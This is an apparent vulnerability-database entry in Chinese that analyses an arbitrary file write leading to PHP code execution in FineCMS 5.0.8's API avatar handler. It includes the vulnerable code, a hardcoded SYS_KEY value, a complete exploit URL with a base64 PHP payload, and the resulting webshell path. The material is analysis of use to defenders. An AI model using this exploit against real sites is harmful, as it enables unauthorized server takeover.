---
source: "hatch 补库批 20260928"
product: "FineCMS5.0.8 API avatar"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Finecms 5.0.8 任意代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：可预测或Cookie前缀可泄漏SYS_KEY；目录可写执行PHP"
side_effects: "未执行；本文需注意的操作影响：标题任意代码执行实际文件写入→PHP执行，认证码条件不可丢"
source_status: "unknown"
id: "vw-17af0cba678018412ed24ec0"
entity_id: "ve-17af0cba678018412ed24ec0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：可预测或Cookie前缀可泄漏SYS_KEY；目录可写执行PHP

- **凭据与会话边界（1）**：与171/172第一节同源拆分，简介加入自定义Cookie前缀信息，需保留该差异而核验硬编码断言。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **证据待核（2）**：解码对象被误说为result\[1\]，实际移除该前缀后解码；截图仅1.png占位。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：标题任意代码执行实际文件写入→PHP执行，认证码条件不可丢。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Finecms 5.0.8 任意代码执行漏洞

一、漏洞简介
------------

> auth值是由`zero_ci_session`中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义

二、漏洞影响
------------

Finecms 5.0.8

三、复现过程
------------

### 漏洞分析

在`/controllers/Api.php`中的data2函数，大约在第115行，有问题的代码大约在178行

    public function data2() {

        $data = array();

        // 安全码认证
        $auth = $this->input->get('auth', true);
        if ($auth != md5(SYS_KEY)) {
            // 授权认证码不正确
            $data = array('msg' => '授权认证码不正确', 'code' => 0);
        } else {
            // 解析数据
            $cache = '';
            $param = $this->input->get('param');
            if (isset($param['cache']) && $param['cache']) {
                $cache = md5(dr_array2string($param));
                $data = $this->get_cache_data($cache);
            }
            if (!$data) {

                if ($param == 'login') {
                    // 登录认证
                    $code = $this->member_model->login(
                        $this->input->get('username'),
                        $this->input->get('password'),
                        0, 1);
                    if (is_array($code)) {
                        $data = array(
                            'msg' => 'ok',
                            'code' => 1,
                            'return' => $this->member_model->get_member($code['uid'])
                        );
                    } elseif ($code == -1) {
                        $data = array('msg' => fc_lang('会员不存在'), 'code' => 0);
                    } elseif ($code == -2) {
                        $data = array('msg' => fc_lang('密码不正确'), 'code' => 0);
                    } elseif ($code == -3) {
                        $data = array('msg' => fc_lang('Ucenter注册失败'), 'code' => 0);
                    } elseif ($code == -4) {
                        $data = array('msg' => fc_lang('Ucenter：会员名称不合法'), 'code' => 0);
                    }
                } elseif ($param == 'update_avatar') {
                    // 更新头像
                    $uid = (int)$_REQUEST['uid'];
                    $file = $_REQUEST['file'];
                    //
                    // 创建图片存储文件夹
                    $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/';
                    @dr_dir_delete($dir);
                    if (!is_dir($dir)) {
                        dr_mkdirs($dir);
                    }
                    $file = str_replace(' ', '+', $file);
                    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                        $new_file = $dir.'0x0.'.$result[2];
                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                            $data = array(
                                'msg' => '目录权限不足或磁盘已满',
                                'code' => 0
                            );
                        }

其中，首先

    $file = $_REQUEST['file'];

获取\$file变量

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                            $new_file = $dir.'0x0.'.$result[2];
                            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                                $data = array(
                                    'msg' => '目录权限不足或磁盘已满',
                                    'code' => 0
                                );

然后用preg\_match函数进行正则匹配，因为\$file变量可控，所以\$result也是可控的，从而\$new\_file也是可控的，可以构造为php文件，然后

    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file))))

对\$result\[1\]进行base64解码，然后写入\$new\_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过

     $auth = $this->input->get('auth');
     if ($auth != md5(SYS_KEY))

SYS\_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在`./WWW/config/system.php`中有定义。直接md5加密一次即可绕过

### 漏洞复现

    http://www.0-sec.org:88/index.php?c=api&m=data2&auth=目标站点值&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+

无需登录，直接getshell,路径为

    http://www.0-sec.org:88/uploadfile/member/0/0x0.php

> **图片待核**：原归档在此处仅保留文件名 `1.png`，没有可对应的图片引用。

参考链接
--------

> http://4o4notfound.org/index.php/archives/40/
